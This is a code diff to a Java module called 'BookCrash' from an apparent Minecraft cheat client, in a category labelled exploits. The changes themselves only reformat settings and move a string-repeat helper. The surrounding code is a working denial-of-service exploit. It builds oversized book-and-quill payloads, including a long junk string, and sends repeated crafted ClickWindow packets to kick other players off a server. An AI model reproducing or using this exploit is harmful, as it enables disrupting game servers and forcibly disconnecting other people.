@@ -28,15 +28,11 @@ public class BookCrash extends Module {
 
     public BookCrash() {
         super("BookCrash", -1, Category.EXPLOITS, "Abuses book and quill packets to remotely kick people.",
-                new SettingSlider("Uses: ",1, 20, 5, 0),
+                new SettingSlider("Uses: ", 1, 20, 5, 0),
                 new SettingSlider("Delay: ", 0, 5, 0, 0),
                 new SettingMode("Mode: ", "Ascii", "Fill", "Random", "Old"),
-                new SettingSlider("Pages: ", 1,100,50,0),
-                new SettingSlider("Chars per Page: ", 1,210,210,0));
-    }
-
-    private static String repeat(int count, String with) {
-        return new String(new char[count]).replace("\0", with);
+                new SettingSlider("Pages: ", 1, 100, 50, 0),
+                new SettingSlider("Chars/Page: ", 1, 210, 210, 0));
     }
 
     @Subscribe
@@ -64,7 +60,6 @@ public class BookCrash extends Module {
             size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
         }else if (getSettings().get(2).toMode().mode == 3) {
             size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
-
         }
         
         for (int i = 0; i < 50; i++) {
@@ -83,5 +78,9 @@ public class BookCrash extends Module {
         for(int i = 0; i < getSettings().get(0).toSlider().getValue(); i++) {
             mc.player.networkHandler.sendPacket(new ClickWindowC2SPacket(0, 0, 0, SlotActionType.PICKUP, bookObj, (short) 0));
         }
+    }
+    
+    private static String repeat(int count, String with) {
+        return new String(new char[count]).replace("\0", with);
     }
 }
